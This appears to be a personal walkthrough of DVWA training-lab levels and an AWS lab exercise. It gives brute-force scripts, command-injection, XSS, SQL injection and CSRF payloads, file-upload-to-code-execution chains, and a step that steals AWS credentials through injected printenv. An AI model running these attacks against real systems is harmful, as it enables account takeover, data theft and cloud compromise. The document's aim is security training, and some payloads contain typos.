# Brute Force
## Low and Medium
In the `Brute Force Low` level we find that the password is being shared in the URL of the website, like,

http://127.0.0.1/dvwa/vulnerabilities/brute/?username=admin&password=123456&Login=Login#

We can brute force the different URLs using this code and the rockyou.txt wordlist.

If the password is wrong, I will get, 
`Username and/or password incorrect.`
on the screen.

```py
import requests
def get_url(username,password):
    return f"http://127.0.0.1/dvwa/vulnerabilities/brute/?username={username}&password={password}&Login=Login#"

username = input("Enter Username : ")

COOKIES = {
    "PHPSESSID":"pf9kipp16vs54366mr21smurse",
    "security":"high"
}
with open("rockyou.txt") as f:
    while True:
        p = f.readline().strip()
        url = get_url(username,p)
        r = requests.get(url,cookies=COOKIES)
        print("Checking ", p)
        if 'incorrect' not in r.text:
            print(f"Found password for {username} = {p}")
            break
```
## High
Use the following code for High level
```py
import requests
def get_url(username,password,token):
    return f"http://127.0.0.1/dvwa/vulnerabilities/brute/?username={username}&password={password}&user_token={token}&Login=submit#"
username = input("Enter Username : ")
COOKIES = {
    "PHPSESSID":"km7qua1eth40r643ggc8ll6cbp",
    "security":"high"
}
passwords = open("rockyou.txt","r")
while True:
    session = requests.Session()
    r = session.get("http://127.0.0.1/dvwa/vulnerabilities/brute/index.php",cookies=COOKIES)
    body = r.text.split(" ")
    token = body[body.index("name='user_token'")+1].split("=")[1][1:-1]

    p = passwords.readline().strip()
    url = get_url(username,p,token)
    r = session.get(url,cookies=COOKIES)
    if 'incorrect' in r.text:
        print("Trying ",p)
    else:
        print("Found ",p)
        break
```

# Command Injection
Trying to inject a windows command - `dir`
## Low
```php
$target = $_REQUEST[ 'ip' ];

    // Determine OS and execute the ping command.
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        // Windows
        $cmd = shell_exec( 'ping  ' . $target );
    }
```
It is directly executing the ``$target`` without any input validation.
**Attack :** 127.0.0.1 && dir
## Medium
Some level of input validation is performed this time,
```php
// Set blacklist
    $substitutions = array(
        '&&' => '',
        ';'  => '',
    );

    // Remove any of the charactars in the array (blacklist).
    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );
```
But, notice that only `&&` is being replaced, we can use `&`.
**Attack :** 127.0.0.1 & dir
## High
More Filtering has been done,
```php
if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $target = trim($_REQUEST[ 'ip' ]);

    // Set blacklist
    $substitutions = array(
        '&'  => '',
        ';'  => '',
        '| ' => '',
        '-'  => '',
        '$'  => '',
        '('  => '',
        ')'  => '',
        '`'  => '',
        '||' => '',
    );

    // Remove any of the characters in the array (blacklist).
    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );
```
The substitutions only match `| ` and not `|`. Hence, there is a loophole in the validation.
The pipe symbol (|) is used for output redirection, and that is why you want see the output for the ping command.
**Attack :** 127.0.0.1|dir (No Spaces)
# CSRF
## Low
```html
<form action="http://127.0.0.1/dvwa/vulnerabilities/csrf/?" method="GET">
 <h1>Click Me</h1>
 <input type="hidden" AUTOCOMPLETE="off" name="password_new" value="hacked">
 <input type="hidden" AUTOCOMPLETE="off" name="password_conf" value="hacked">
 <input type="submit" value="Change" name="Change">
</form>
```

The above website is a phishing website created by the attacker, it sends a request to the link,
"http://127.0.0.1/dvwa/vulnerabilities/csrf/?" with the new password in the parameters of the link. It is hence used to attack the CSRF vulnerability, since, the website doesn't check for the source of the request.

---
# XSS DOM
## Low 
**Attack :**  `<script>alert("hacked")</script>`
## Medium
```html
<select name="default">
				<script>
					if (document.location.href.indexOf("default=") >= 0) {
						var lang = document.location.href.substring(document.location.href.indexOf("default=")+8);
						document.write("<option value='" + lang + "'>" + decodeURI(lang) + "</option>");
						document.write("<option value='' disabled='disabled'>----</option>");
					}
					    
					document.write("<option value='English'>English</option>");
					document.write("<option value='French'>French</option>");
					document.write("<option value='Spanish'>Spanish</option>");
					document.write("<option value='German'>German</option>");
				</script>
			</select>
```
We have to break out of the `<select>` tag, and for that we have to, use the following command.
Our input is `lang`	, from there,
**Attack :**`></option></script></select><img src=x onerror=alert("hacked")>`
## High
The programmer has set it in such a way that, any other input we give other than the four languages will be defaulted to English.

```php
// Is there any input?
if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {

    # White list the allowable languages
    switch ($_GET['default']) {
        case "French":
        case "English":
        case "German":
        case "Spanish":
            # ok
            break;
        default:
            header ("location: ?default=English");
            exit;
    }
}
?>	
```
We should avoid sending the payload to the server, for blacklisting, so, we use the `#`
**Attack :** English#<script>alert("hacked")</script>

# XSS REFLECTED
## Low 
**Attack :**  `<script>alert("hacked")</script>`
## Medium
Some level of filtering has been done this time,
```php
$name = str_replace( '<script>', '', $_GET[ 'name' ] );
```
They have only replaced lowercase `<script>`, which means, `<SCRIPT>` will work!	
**Attack :**  `<SCRIPT>alert("hacked")</SCRIPT>`
## High
Only script tags are being targetted by this programmer, use an img tag instead.
**Attack :** `<img src=x onerror=alert("hacked")>`

# XSS STORAGE
## Low 
**Attack :**  `<script>alert("hacked")</sript>` (in Message)
## Medium
Some level of filtering has been done in both input blocks, but the name tag has a weaker level of filtering.

```php
// Sanitize message input
    $message = strip_tags( addslashes( $message ) );
    $message = htmlspecialchars( $message );

    // Sanitize name input
    $name = str_replace( '<script>', '', $name );
```
The strip_tags function is strong and removes all html, php tags. We can target the weaker `name` input field, but, the problem is the `name` field takes only 10 characters. To increase this number, 

* Ctrl + Shift + i
* Find the input tag of the `name` field in the console,
* Note, that it has a maxlength value set to 10, increase it to 50.
* Attack the `name` field.

**Attack :** `<SCRIPT>alert("hacked")</SCRIPT>`
## High
It is the same case as medium, but this time, there is too much focus on the script tag, so try img tags.
**Attack :** `<img src=x onerror=alert("hacked")>` in Name

# File Upload
## Low
* Create the following php file
* Upload it
```php
<?php
echo getenv("PATH")
?>
```
* Access the file.

## Medium
* Create the php file
* Save it as .png file
* upload it
* go to command injection
* ``127.0.0.1 & copy ..\..\hackable\uploads\uploadmed.png ..\..\hackable\uploads\uploadmed.php``
* now go back to uploads and access the file.

## High
* The php file looks like
```php
GIF98
<?php
echo getenv('PATH')
?>
```
* Save it as .jpeg file
* Upload it
* go to command injection
* ``127.0.0.1|copy ..\..\hackable\uploads\uploadhigh.jpeg ..\..\hackable\uploads\uploadhigh.php``
* now go back to uploads and access the file.

# SQL Injection

## Low
**Attack :** %' or 1=1 union select null,concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users#
(or)
%' or 1=1 union select null,version()#

## Medium
**Attack :** 1 or 1=1 union select null,concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users
(or)
1 or 1=1 union select null,version()

## High
* Click on `Click here to change ID`
**Attack :** %' or 1=1 union select null,concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users#
(or)
%' or 1=1 union select null,version()#

# CSP Bypass
## Low
* go to hastebin
* make a file with contents
```js
alert(document.cookie);
```
* Save and go to `just text`
* Paste the link in the input field and click go.

# AWS Cloud Attack Defense Command Injection
* Upload the file
* Switch on proxy
* Catch in burpsuite
* Right click and send to repeater
* add printenv to the end of the Filename
* Collect the following from response
  * SESSION TOKEN 
  * SECRET_ACCESS_KEY
  * ACCESS_KEY_ID
* Export them in the terminal in the same order
* Run the following commands

```sh
aws s3 ls s3://temporary-public-image-store
aws s3 cp s3://temporary-public-image-store/flag.txt .
cat flag.txt
```
# Open SSL
* Install from https://slproweb.com/products/Win32OpenSSL.html 5MB File

ENCRYPTION:
`openssl enc -salt -aes-256-cbc -in file.txt -out enc.txt`

`openssl enc -d -aes-256-cbc -in enc.txt -out dec.txt`

HASH:
`openssl dgst -sha256 file.txt`

`openssl dgst -sha256 file.txt > hash.txt`
